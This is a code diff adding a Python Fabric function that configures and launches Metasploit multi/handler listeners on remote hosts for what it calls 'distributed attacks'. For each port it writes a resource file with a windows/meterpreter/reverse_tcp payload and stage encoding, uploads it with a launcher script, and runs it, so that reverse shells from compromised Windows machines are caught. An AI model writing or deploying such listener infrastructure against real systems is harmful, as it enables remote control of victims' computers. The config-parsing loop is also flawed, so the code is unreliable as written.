@@ -92,3 +92,34 @@ def get_logz(host, user, sshkey):
         get("/usr/share/set/screenlog.0", "data/remote_logs/")
         get("~/.set/reports/*", "data/remote_logs")
         print green("Remote logs sucessfully saved to the data directory...")
+
+# Metasploit listener setup for distributed attacks
+
+
+def metalistener(host, user, sshkey):
+    with settings(host_string = host, user = user, key_filename = sshkey, warn_only =  True):
+        setconf = open("config/autoset/set_config", "r")
+        for line in setconf.readlines():
+            if "POWERSHELL_MULTI_PORTS" in line:
+                line_str = line.split("=")
+                ports = line_str[1].split(",")
+            else:
+                print "check your set_config file for POWERSHELL_MULTI_PORTS ports..."
+                pass
+
+        metarc = open("data/temp/meta_config", "a")
+        for port in ports:
+            metarc.write("""\nuse exploit/multi/handler\n
+                         set PAYLOAD windows/meterpreter/reverse_tcp\n
+                         set LHOST %s\n
+                         set EnableStageEncoding true\n
+                         set ExitOnSession false\n
+                         set LPORT %s\n
+                         exploit -j""" % (host, port))
+
+        metarc.close()
+        put("data/temp/meta_config", "/tmp/meta_config")
+        put("config/autoset/metalisten.sh", "/tmp/metalisten.sh")
+        screen = run("bash /tmp/metalisten.sh")
+        sleep(1)
+        return screen
